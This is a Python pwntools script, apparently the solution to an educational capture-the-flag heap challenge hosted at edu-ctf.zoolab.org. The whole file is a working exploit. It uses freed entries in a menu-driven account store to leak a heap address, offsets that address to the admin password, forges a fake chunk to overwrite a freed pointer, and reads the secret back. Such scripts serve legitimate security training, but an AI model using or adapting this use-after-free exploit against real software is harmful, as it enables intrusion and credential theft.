from pwn import *

context.arch = 'amd64'
r = remote('edu-ctf.zoolab.org', 10008)

# add 1 
print(r.recvuntil(b'> ').decode())
r.sendline(b'1')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'1')
print(r.recvuntil(b'> ').decode()) # username
r.send(b'AAAAAAAAAAAAAAAA')
print(r.recvuntil(b'> ').decode()) # password
r.send(b'AAAAAAAAAAAAAAAA')

# edit 1
print(r.recvuntil(b'> ').decode())
r.sendline(b'2')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'1')
print(r.recvuntil(b'> ').decode()) # size
r.sendline(str(0x28).encode())
r.send('A\x00'.encode())

# add 2
print(r.recvuntil(b'> ').decode())
r.sendline(b'1')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'2')
print(r.recvuntil(b'> ').decode()) # username
r.send('BBBBBBBBBBBBBBBB'.encode())
print(r.recvuntil(b'> ').decode()) # password
r.send('BBBBBBBBBBBBBBBB'.encode())

# edit 2
print(r.recvuntil(b'> ').decode())
r.sendline(b'2')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'2')
print(r.recvuntil(b'> ').decode()) # size
r.sendline(str(0x28).encode())
r.send('B\x00'.encode())

# delete 1
print(r.recvuntil(b'> ').decode())
r.sendline(b'3')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'1')

# delete 2
print(r.recvuntil(b'> ').decode())
r.sendline(b'3')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'2')

# show
print(r.recvuntil(b'> ').decode())
r.sendline(b'4')
print(r.recvuntil(b'[2] ').decode())
admin_pwd = u64(r.recv(6).ljust(8, b'\x00')) - 0xd0 +0x20
print(hex(admin_pwd))

# edit 1
fake_chunk = flat(
    b'AAAAAAAA', b'AAAAAAAA',
    b'AAAAAAAA', b'AAAAAAAA', 
    b'AAAAAAA\x00', 0x31,
    b'AAAAAAAA', b'AAAAAAA\x00',
    b'AAAAAAAA', b'AAAAAAAA', 
    admin_pwd
)
r.recvuntil(b'> ')
r.sendline(b'2')
print(r.recvuntil(b'> ').decode()) # index
r.sendline(b'1')
print(r.recvuntil(b'> ').decode()) # size
r.sendline(str(0x58).encode())
r.send(fake_chunk)

# show
print(r.recvuntil(b'> ').decode())
r.sendline(b'4')

r.interactive()